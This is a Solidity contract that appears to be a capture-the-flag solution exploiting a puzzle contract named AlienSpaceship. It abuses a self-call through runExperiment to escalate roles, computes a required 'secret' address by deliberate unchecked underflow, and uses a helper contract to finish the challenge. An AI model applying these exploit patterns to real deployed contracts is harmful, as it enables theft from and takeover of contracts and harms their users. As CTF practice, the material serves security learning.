// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import'AlienSpaceship.sol';
import 'Helper.sol';

contract Attack{
    AlienSpaceship alien;
    Helper helper;
    constructor(AlienSpaceship _alien){
        alien=_alien;
        //treba pozvatio da bi brod postao engenir
        alien.applyForJob(keccak256("ENGINEER"));
        //contract AlienSpaceship becoming an engineer, so we can become physicist
        alien.runExperiment(abi.encodeWithSignature("applyForJob(bytes32)", keccak256("ENGINEER")));
        alien.quitJob();
        alien.applyForJob(keccak256("PHYSICIST"));
        //enabling Wormholes
        alien.enableWormholes();

        helper= new Helper(alien);
        helper.claimRole();

    }

    //call function attack() after 12 or more seconds
    function attack()external{
        alien.applyForPromotion(keccak256("CAPTAIN"));
        uint160 secret;
        
        //underflowing so we get a secret 
        //where uint160(51) == secret + uint160(address(this))
        unchecked{
            secret= uint160(51)- uint160(address(this));
        }
        //going to Area51
        alien.visitArea51(address(secret));
        
        
        helper.help1();
        //change of coordinates :)
        alien.jumpThroughWormhole(40_000e18,40_000e18,40_000e18);
        helper.help2();


        alien.abortMission();
        
    }

}
